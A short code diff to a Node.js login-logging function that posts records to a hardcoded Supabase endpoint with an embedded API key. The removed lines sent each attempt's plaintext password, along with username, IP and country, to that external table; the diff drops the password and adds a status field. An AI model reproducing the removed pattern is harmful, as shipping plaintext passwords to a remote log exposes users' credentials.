@@ -3,7 +3,7 @@ const fetch = require('node-fetch');
 const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co/rest/v1/log';
 const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlheXJic3ZhZml6cmxkbWt4dHZqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg0MTU0NDUsImV4cCI6MjAzMzk5MTQ0NX0.alW7sPzJLaJA_V9Ou4H7QtVotfpJQY9xqIplpr7gN4Q';
 
-const logLoginAttempt = async (username, password, ip, browser, country) => {
+const logLoginAttempt = async (username, ip, browser, status) => {
   try {
     const response = await fetch(supabaseUrl, {
       method: 'POST',
@@ -14,11 +14,10 @@ const logLoginAttempt = async (username, password, ip, browser, country) => {
       },
       body: JSON.stringify({
         username: username,
-        pass: password,
         time: new Date().toISOString(),
         ip: ip,
         browser: browser,
-        country: country
+        status: status
       })
     });
 
